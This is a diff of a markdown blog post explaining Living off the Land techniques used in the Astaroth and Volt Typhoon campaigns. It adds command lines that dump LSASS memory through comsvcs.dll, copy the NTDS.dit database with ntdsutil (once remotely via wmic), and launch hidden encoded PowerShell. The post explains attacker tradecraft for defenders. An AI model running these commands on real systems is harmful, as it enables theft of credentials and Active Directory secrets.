@@ -10,14 +10,13 @@ For a long time, I have seen Living off the Land (LotL) techniques discussed in 
 I will show you how LotL techniques were used by attackers, based on past Microsoft Security blogs.
 
 
-
 ### [Astaroth “living-off-the-land”](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)
 This is a somewhat older blog, but I love it because it includes some Windows LotL-related attacks in the attack flow.
 
 1. LNK
-1. WMI
-2. Bitsadmin
-3. Certutil
+2. WMI
+3. Bitsadmin
+4. Certutil
 
 **LNK** : One common pattern is that an attacker creates a LNK file with a target path that executes a PowerShell command to download and run a malicious script from the internet.
 
@@ -55,18 +54,24 @@ certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z %PUBLIC%\L
    - cmd.exe / powershell.exe
    - rundll32.exe
    - base64 encode 
+3. ntdsutil.exe
 
-```powershell
+```cmd
 cmd.exe /c powershell -exec bypass -W hidden -nop -E <Base64>
 ```
+
 ```cmd
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> %Temp%\lsass.dmp full
+```
+
+```cmd
+wmic /node: /user: /password: process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \"as i ntds\" ifm \"create full C:\Windows\Temp\tmp" q q"
+```
+
+```cmd
+cmd.exe /c ntdsutil "as i ntds" ifm "create full C:\Windows\Temp\pro" q q
 ```
 
 ![alt text](image-1.png)
 >  Volt Typhoon attack diagram
 ---
-- Mshta
-- Regsvr32
-- Scheduled Tasks
-
